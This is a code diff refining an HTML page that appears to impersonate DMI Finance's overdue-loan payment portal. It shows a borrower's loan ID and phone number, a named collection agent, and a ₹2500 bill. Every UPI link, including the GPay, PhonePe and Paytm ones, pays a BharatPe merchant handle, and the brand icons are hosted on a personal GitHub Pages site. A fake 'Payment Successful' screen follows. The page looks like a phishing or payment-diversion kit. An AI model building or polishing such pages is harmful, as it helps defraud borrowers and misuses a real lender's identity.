@@ -6,14 +6,21 @@
     <title>DMI Finance - Overdue Payment</title>
     <!-- Load Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- Load Google Font: Inter -->
+    <!-- Load Google Font: Titillium Web (SemiBold 600 & Bold 700) -->
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
+    <link href="https://fonts.googleapis.com/css2?family=Titillium+Web:wght@600;700&display=swap" rel="stylesheet" />
     <style>
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            font-family: 'Titillium Web', -apple-system, BlinkMacSystemFont, sans-serif;
+            font-weight: 600;
             -webkit-tap-highlight-color: transparent;
+        }
+        .font-normal, .font-medium {
+            font-weight: 600 !important;
+        }
+        .font-semibold, .font-bold, .font-extrabold, .font-black {
+            font-weight: 700 !important;
         }
     </style>
 </head>
@@ -25,8 +32,8 @@
         <!-- Top Wrapper (Header + Details Card + Pay Button) -->
         <div class="w-full flex flex-col items-center">
 
-            <!-- Header Banner (#D3D5D4) -->
-            <header class="w-full bg-[#D3D5D4] py-6 px-6 flex items-center justify-center">
+            <!-- Header Banner (#ECEEEF) -->
+            <header class="w-full bg-[#ECEEEF] py-6 px-6 flex items-center justify-center">
                 <img
                     src="https://www.dmifinance.in/wp-content/uploads/2026/05/Logo-final-RGB.svg"
                     alt="DMI Finance Logo"
@@ -38,8 +45,8 @@
             <!-- Main Content Area -->
             <main class="w-full px-5 pt-6 pb-8 flex flex-col items-center">
 
-                <!-- Customer & Bill Statement Card (#D8DADA) -->
-                <section aria-label="Customer Payment Details" class="w-full bg-[#D8DADA] rounded-2xl p-5 text-left shadow-2xs space-y-2">
+                <!-- Customer & Bill Statement Card (#F2F4F4) -->
+                <section aria-label="Customer Payment Details" class="w-full bg-[#F2F4F4] rounded-2xl p-5 text-left shadow-2xs space-y-2">
                     <!-- Row 1: Customer Name -->
                     <div class="grid grid-cols-[44%_56%] items-baseline gap-1 text-[13.5px] sm:text-[14px]">
                         <span class="text-gray-800 font-medium">Customer Name:</span>
@@ -52,7 +59,7 @@
                         <span class="font-bold text-black">DMI0053465728</span>
                     </div>
 
-                    <!-- Row 3: Register Number -->
+                    <!-- Row 3: Registered Number -->
                     <div class="grid grid-cols-[44%_56%] items-baseline gap-1 text-[13.5px] sm:text-[14px]">
                         <span class="text-gray-800 font-medium">Registered Number:</span>
                         <span class="font-bold text-black">+91 97983 90198</span>
@@ -61,7 +68,7 @@
                     <!-- Row 4: Source -->
                     <div class="grid grid-cols-[44%_56%] items-baseline gap-1 text-[13px] sm:text-[13.5px] pt-1">
                         <span class="text-gray-800 font-medium">Source:</span>
-                        <span class="text-gray-900 font-medium">Samsung Mobility</span>
+                        <span class="text-gray-900 font-medium">Samsung Finance+y</span>
                     </div>
 
                     <!-- Row 5: Bill Date -->
@@ -70,13 +77,13 @@
                         <span class="text-gray-900 font-medium">24 November 2026 Ext.</span>
                     </div>
 
-                    <!-- Row 5: EMI -->
+                    <!-- Row 5a: EMI -->
                     <div class="grid grid-cols-[44%_56%] items-baseline gap-1 text-[13px] sm:text-[13.5px]">
                         <span class="text-gray-800 font-medium">EMI:</span>
                         <span class="text-gray-900 font-medium">₹ 1408.14 Per Month</span>
                     </div>
 
-                    <!-- Row 5a: Principal Amount -->
+                    <!-- Row 5b: Principal Amount -->
                     <div class="grid grid-cols-[44%_56%] items-baseline gap-1 text-[13px] sm:text-[13.5px]">
                         <span class="text-gray-800 font-medium">Principal Amount:</span>
                         <span class="text-gray-900 font-medium">₹ 5549.52</span>
@@ -100,13 +107,13 @@
                         <span class="text-gray-900 font-medium">Cleared</span>
                     </div>
 
-                    <!-- Row 9: Prescription -->
+                    <!-- Row 9a: Prescription -->
                     <div class="grid grid-cols-[44%_56%] items-baseline gap-1 text-[13px] sm:text-[13.5px]">
                         <span class="text-gray-800 font-medium">Prescription:</span>
                         <span class="text-gray-900 font-medium">Amount of INR 2500.00 which is part of DMI0053465728</span>
                     </div>
 
-                    <!-- Row 10: Collection Agent -->
+                    <!-- Row 9b: Collection Agent -->
                     <div class="grid grid-cols-[44%_56%] items-baseline gap-1 text-[13px] sm:text-[13.5px]">
                         <span class="text-gray-800 font-medium">Collection Agent:</span>
                         <span class="text-gray-900 font-medium">MD ADNAN</span>
@@ -114,7 +121,7 @@
 
                     <div class="border-t border-gray-400/50 my-2 pt-2"></div>
 
-                    <!-- Row 11: Bill Amount -->
+                    <!-- Row 10: Bill Amount Payable -->
                     <div class="grid grid-cols-[44%_56%] items-baseline gap-1 text-[15px] sm:text-[16px]">
                         <span class="text-gray-900 font-medium">Bill Amount:</span>
                         <span class="font-bold text-black">₹ 2500</span>
@@ -138,24 +145,21 @@
 
                 <!-- Direct App-Specific UPI Intent Quick Launchers -->
                 <div id="quickUpiApps" class="mt-4 w-full">
-                    <p class="text-xs font-medium text-gray-500 text-center mb-2.5">Or pay directly via UPI app</p>
-                    <div class="grid grid-cols-4 gap-2">
+                    <p class="text-xs font-medium text-gray-500 text-center mb-5">Or pay directly via UPI app</p>
+                    <div class="grid grid-cols-4 gap-3">
                         <!-- Google Pay -->
                         <a 
                             href="tez://upi/pay?pa=BHARATPE09917548991@yesbankltd&pn=DMI%20Finance&am=2500.00&cu=INR"
                             onclick="handleAppSpecificClick(event, 'tez://upi/pay?pa=BHARATPE09917548991@yesbankltd&pn=DMI%20Finance&am=2500.00&cu=INR')"
-                            class="flex flex-col items-center justify-center py-2.5 px-1.5 bg-white border border-gray-200 hover:border-[#0B3B9D] rounded-xl shadow-2xs active:scale-95 transition-all"
+                            class="group flex flex-col items-center justify-center active:scale-95 transition-transform"
                         >
-                            <span class="w-8 h-8 rounded-full bg-gray-50 border border-gray-100 flex items-center justify-center mb-1 p-1 overflow-hidden">
-                                <!-- Provided GPay SVG -->
-                                <svg class="w-full h-full object-contain" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 123.84 104.9" style="enable-background:new 0 0 123.84 104.9" xml:space="preserve" aria-hidden="true"><style type="text/css"><![CDATA[
-	.st0{clip-path:url(#SVGID_3_);}
-	.st1{clip-path:url(#SVGID_4_);}
-	.st2{clip-path:url(#SVGID_9_);}
-	.st3{fill:#2DA94F;}
-	.st4{fill:#FDBD00;}
-	.st5{clip-path:url(#SVGID_10_);}
-]]></style><g><g><defs><path id="SVGID_1_" d="M65.7,63.18l30.4-52.66l16.56,9.56c10.69,6.17,14.36,19.85,8.18,30.54l-17.12,29.65 c-3.86,6.68-12.4,8.97-19.09,5.12l-15.37-8.87C64.6,73.81,63,67.84,65.7,63.18L65.7,63.18z"/></defs><defs><rect id="SVGID_2_" y="0.02" width="123.84" height="104.88"/></defs><clipPath id="SVGID_3_"><use xlink:href="#SVGID_1_" style="overflow:visible"/></clipPath><clipPath id="SVGID_4_" class="st0"><use xlink:href="#SVGID_2_" style="overflow:visible"/></clipPath><g class="st1"><defs><rect id="SVGID_5_" x="64.32" y="10.34" width="59.52" height="77.04"/></defs><clipPath id="SVGID_6_"><use xlink:href="#SVGID_5_" style="overflow:visible"/></clipPath><g style="clip-path:url(#SVGID_6_)"><image style="overflow:visible" width="132" height="164" xlink:href="data:image/jpeg;base64,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 nJT82+vk5Kfmw2HybbUs/hT83f/Z" transform="matrix(0.48 0 0 -0.48 63.3027 88.1797)"/></g></g></g><path class="st4" d="M62.46,26.62l-37.82,65.5l16.56,9.56c10.69,6.17,24.37,2.51,30.54-8.18l24.53-42.49 c3.86-6.68,1.57-15.23-5.12-19.09l-15.37-8.87C71.12,20.35,65.16,21.95,62.46,26.62L62.46,26.62z"/><path class="st3" d="M96.1,10.51L84.38,3.75C71.02-3.97,53.93,0.61,46.21,13.98L24.47,51.62c-3.86,6.68-1.57,15.23,5.12,19.09 l11.72,6.76c6.68,3.86,15.23,1.57,19.09-5.12l25.95-44.95l0,0c5.39-9.34,17.33-12.53,26.66-7.14L96.1,10.51L96.1,10.51z M96.1,10.51L96.1,10.51L96.1,10.51L96.1,10.51z"/><g><defs><path id="SVGID_7_" d="M49.58,25.01l-12.93-7.45c-5.76-3.32-13.13-1.35-16.46,4.4L4.67,48.77c-7.64,13.2-3.11,30.08,10.12,37.7 l9.85,5.67l11.94,6.88l5.18,2.98c-9.2-6.16-12.12-18.5-6.5-28.21l4.02-6.94l14.71-25.42C57.32,35.69,55.35,28.33,49.58,25.01 L49.58,25.01z"/></defs><defs><rect id="SVGID_8_" y="0.02" width="123.84" height="104.88"/></defs><clipPath id="SVGID_9_"><use xlink:href="#SVGID_7_" style="overflow:visible"/></clipPath><clipPath id="SVGID_10_" class="st2"><use xlink:href="#SVGID_8_" style="overflow:visible"/></clipPath><g class="st5"><defs><rect id="SVGID_11_" x="0.96" y="15.86" width="54.72" height="86.16"/></defs><clipPath id="SVGID_12_"><use xlink:href="#SVGID_11_" style="overflow:visible"/></clipPath><g style="clip-path:url(#SVGID_12_)"><image style="overflow:visible" width="120" height="182" xlink:href="data:image/jpeg;base64,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 hZtD6Qoy/9k=" transform="matrix(0.48 0 0 -0.48 0.3071 102.542)"/></g></g></g></g></svg>
+                            <span class="w-12 h-12 rounded-full bg-white border border-gray-200 group-hover:border-[#0B3B9D] shadow-xs flex items-center justify-center mb-1.5 overflow-hidden transition-colors">
+                                <img
+                                    src="https://adnan369.github.io/dmifinance/icon/GPay.png"
+                                    alt="GPay"
+                                    onerror="this.replaceWith(Object.assign(document.createElement('span'), { textContent: 'GPay', className: 'text-xs font-extrabold text-[#4285F4]' }))"
+                                    class="w-full h-full object-cover scale-105"
+                                />
                             </span>
                             <span class="text-[11px] font-semibold text-gray-800">GPay</span>
                         </a>
@@ -164,11 +168,15 @@
                         <a 
                             href="phonepe://pay?pa=BHARATPE09917548991@yesbankltd&pn=DMI%20Finance&am=2500.00&cu=INR"
                             onclick="handleAppSpecificClick(event, 'phonepe://pay?pa=BHARATPE09917548991@yesbankltd&pn=DMI%20Finance&am=2500.00&cu=INR')"
-                            class="flex flex-col items-center justify-center py-2.5 px-1.5 bg-white border border-gray-200 hover:border-[#0B3B9D] rounded-xl shadow-2xs active:scale-95 transition-all"
+                            class="group flex flex-col items-center justify-center active:scale-95 transition-transform"
                         >
-                            <span class="w-8 h-8 rounded-full overflow-hidden flex items-center justify-center mb-1 shadow-2xs">
-                                <!-- Provided PhonePe SVG -->
-                                <svg class="w-full h-full object-contain" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="2" aria-hidden="true"><circle cx="-25.926" cy="41.954" r="29.873" fill="#5f259f" transform="rotate(-76.714 -48.435 5.641) scale(8.56802)"/><path d="M372.164 189.203c0-10.008-8.576-18.593-18.584-18.593h-34.323l-78.638-90.084c-7.154-8.577-18.592-11.439-30.03-8.577l-27.17 8.577c-4.292 1.43-5.723 7.154-2.862 10.007l85.8 81.508H136.236c-4.293 0-7.154 2.861-7.154 7.154v14.292c0 10.016 8.585 18.592 18.592 18.592h20.015v68.639c0 51.476 27.17 81.499 72.931 81.499 14.292 0 25.739-1.431 40.03-7.146v45.753c0 12.87 10.016 22.886 22.885 22.886h20.015c4.293 0 8.577-4.293 8.577-8.586V210.648h32.893c4.292 0 7.145-2.861 7.145-7.145v-14.3zM280.65 312.17c-8.576 4.292-20.015 5.723-28.591 5.723-22.886 0-34.324-11.438-34.324-37.176v-68.639h62.915v100.092z" fill="#fff" fill-rule="nonzero"/></svg>
+                            <span class="w-12 h-12 rounded-full bg-white border border-gray-200 group-hover:border-[#0B3B9D] shadow-xs flex items-center justify-center mb-1.5 overflow-hidden transition-colors">
+                                <img
+                                    src="https://adnan369.github.io/dmifinance/icon/PhonePe.png"
+                                    alt="PhonePe"
+                                    onerror="this.replaceWith(Object.assign(document.createElement('span'), { textContent: 'PhonePe', className: 'text-[10px] font-extrabold text-[#5F259F]' }))"
+                                    class="w-full h-full object-cover scale-105"
+                                />
                             </span>
                             <span class="text-[11px] font-semibold text-gray-800">PhonePe</span>
                         </a>
@@ -177,13 +185,15 @@
                         <a 
                             href="paytmmp://pay?pa=BHARATPE09917548991@yesbankltd&pn=DMI%20Finance&am=2500.00&cu=INR"
                             onclick="handleAppSpecificClick(event, 'paytmmp://pay?pa=BHARATPE09917548991@yesbankltd&pn=DMI%20Finance&am=2500.00&cu=INR')"
-                            class="flex flex-col items-center justify-center py-2.5 px-1.5 bg-white border border-gray-200 hover:border-[#0B3B9D] rounded-xl shadow-2xs active:scale-95 transition-all"
+                            class="group flex flex-col items-center justify-center active:scale-95 transition-transform"
                         >
-                            <span class="w-8 h-8 rounded-full bg-[#002E6E] text-white flex items-center justify-center mb-1 shadow-2xs">
-                                <!-- Crisp Paytm Mark -->
-                                <span class="text-[9.5px] font-black tracking-tighter leading-none">
-                                    <span class="text-white">Pay</span><span class="text-[#00BAF2]">tm</span>
-                                </span>
+                            <span class="w-12 h-12 rounded-full bg-white border border-gray-200 group-hover:border-[#0B3B9D] shadow-xs flex items-center justify-center mb-1.5 overflow-hidden transition-colors">
+                                <img
+                                    src="https://adnan369.github.io/dmifinance/icon/paytm.png"
+                                    alt="Paytm"
+                                    onerror="this.replaceWith(Object.assign(document.createElement('span'), { innerHTML: '<span class=\'text-[#002E6E]\'>Pay</span><span class=\'text-[#00BAF2]\'>tm</span>', className: 'text-[11px] font-black tracking-tight' }))"
+                                    class="w-full h-full object-cover scale-105"
+                                />
                             </span>
                             <span class="text-[11px] font-semibold text-gray-800">Paytm</span>
                         </a>
@@ -192,14 +202,15 @@
                         <a 
                             href="upi://pay?pa=BHARATPE09917548991@yesbankltd&pn=DMI%20Finance&am=2500.00&cu=INR"
                             onclick="handlePrimaryUpiClick(event)"
-                            class="flex flex-col items-center justify-center py-2.5 px-1.5 bg-white border border-gray-200 hover:border-[#0B3B9D] rounded-xl shadow-2xs active:scale-95 transition-all"
+                            class="group flex flex-col items-center justify-center active:scale-95 transition-transform"
                         >
-                            <span class="w-8 h-8 rounded-full bg-gray-50 border border-gray-200 flex items-center justify-center mb-1">
-                                <!-- Crisp UPI Dual Chevron Mark -->
-                                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" aria-hidden="true">
-                                    <path d="M12.5 4L6.5 20h3.6l6-16h-3.6z" fill="#0E8635"/>
-                                    <path d="M17.2 4l-6 16h3.6l6-16h-3.6z" fill="#E97208"/>
-                                </svg>
+                            <span class="w-12 h-12 rounded-full bg-white border border-gray-200 group-hover:border-[#0B3B9D] shadow-xs flex items-center justify-center mb-1.5 overflow-hidden transition-colors">
+                                <img
+                                    src="https://adnan369.github.io/dmifinance/icon/UPI.png"
+                                    alt="UPI"
+                                    onerror="this.replaceWith(Object.assign(document.createElement('span'), { textContent: 'UPI', className: 'text-xs font-extrabold text-[#0E8635]' }))"
+                                    class="w-full h-full object-cover scale-105"
+                                />
                             </span>
                             <span class="text-[11px] font-semibold text-gray-800">Any UPI</span>
                         </a>
@@ -264,8 +275,8 @@
 
             <div class="my-4 flex flex-col items-center">
                 <div class="bg-[#0B3B9D]/5 border border-[#0B3B9D]/20 rounded-xl px-4 py-2 mb-3 text-center w-full">
-                    <span class="text-xs text-gray-600 block">Payable Amount</span>
-                    <span class="text-2xl font-extrabold text-[#0B3B9D]">₹ 2,500</span>
+                    <span class="text-xs text-gray-600 block">Bill Amount</span>
+                    <span class="text-2xl font-extrabold text-[#0B3B9D]">₹ 2500</span>
                 </div>
 
                 <!-- Dynamic UPI QR Code -->
@@ -316,7 +327,7 @@
             <span class="inline-block px-3 py-0.5 bg-emerald-50 text-emerald-700 text-[11px] font-bold uppercase tracking-wider rounded-full border border-emerald-200 mb-1">
                 Payment Successful
             </span>
-            <h2 class="text-xl font-extrabold text-gray-900">INR 2,500 Paid</h2>
+            <h2 class="text-xl font-extrabold text-gray-900">INR 2500 Paid</h2>
             <p class="text-xs text-gray-500 mt-1">Thank you! Your payment to <strong class="text-gray-800">DMI Finance</strong> has been received.</p>
 
             <div class="mt-4 bg-gray-50 rounded-xl p-3.5 text-left space-y-2 border border-gray-200 text-xs">
@@ -327,10 +338,6 @@
                 <div class="flex justify-between">
                     <span class="text-gray-500">DMI Loan ID:</span>
                     <span class="font-bold text-gray-900">DMI0053465728</span>
-                </div>
-                <div class="flex justify-between">
-                    <span class="text-gray-500">Prescription:</span>
-                    <span class="font-bold text-gray-900">Request for Two Installments</span>
                 </div>
                 <div class="flex justify-between">
                     <span class="text-gray-500">UPI Ref / UTR:</span>
